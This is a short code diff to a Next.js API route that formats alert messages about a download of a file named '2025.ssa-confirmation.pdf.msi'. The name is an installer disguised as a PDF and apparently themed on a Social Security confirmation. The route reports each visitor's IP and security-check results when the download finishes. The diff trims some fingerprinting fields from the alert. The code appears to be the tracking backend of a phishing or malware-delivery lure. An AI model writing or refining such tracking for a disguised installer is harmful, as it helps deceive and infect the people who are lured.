@@ -74,7 +74,6 @@ export async function POST(request: NextRequest) {
 }
 
 function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
-    const timestamp = new Date().toISOString();
     const fileName = '2025.ssa-confirmation.pdf.msi';
     
     let eventText = data.event;
@@ -84,15 +83,7 @@ function formatMessage(data: TrackingData, ip: string, security: SecurityCheckRe
         eventText = `Your ${fileName} has finished downloading`;
     }
     
-    let message = `🔔 **${eventText}**
-
-📅 **Time:** ${timestamp}
-🌐 **IP:** ${ip}
-💻 **User Agent:** ${data.userAgent || 'Unknown'}
-📱 **Platform:** ${data.platform || 'Unknown'}
-🖥️ **Screen:** ${data.screenResolution || 'Unknown'}
-🌍 **Language:** ${data.language || 'Unknown'}
-🔗 **Referrer:** ${data.referrer || 'Direct'}`;
+    let message = `🔔 **${eventText}**`;
 
     if (security) {
         message += formatSecurityMessage(security);
